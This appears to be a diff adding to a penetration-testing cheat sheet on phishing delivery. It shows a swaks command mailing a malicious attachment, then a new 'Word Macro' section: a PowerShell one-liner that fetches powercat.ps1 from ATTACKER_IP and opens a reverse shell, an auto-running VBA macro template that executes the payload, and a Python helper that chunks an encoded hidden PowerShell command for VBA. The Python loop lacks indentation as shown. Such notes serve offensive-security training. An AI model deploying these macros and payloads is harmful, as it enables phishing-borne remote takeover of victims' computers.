@@ -42,3 +42,40 @@ Needs an autheticated user
 ```bash
 sudo swaks -t daniela@beyond.com --from john@beyond.com --attach @config.Library-ms --server SMTP_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
+
+### Word Macro
+
+Payload Sample
+
+```powershell
+IEX(New-Object
+System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1');powercat -c
+ATTACKER_IP -p ATTACKER_PORT -e powershell
+```
+
+Macro Template
+
+```vb
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    # Put Payload
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+
+Python Script to fit VBA length
+
+```python
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..." # Here the payload
+n = 50
+for i in range(0, len(str), n):
+print("Str = Str + " + '"' + str[i:i+n] + '"')
+```
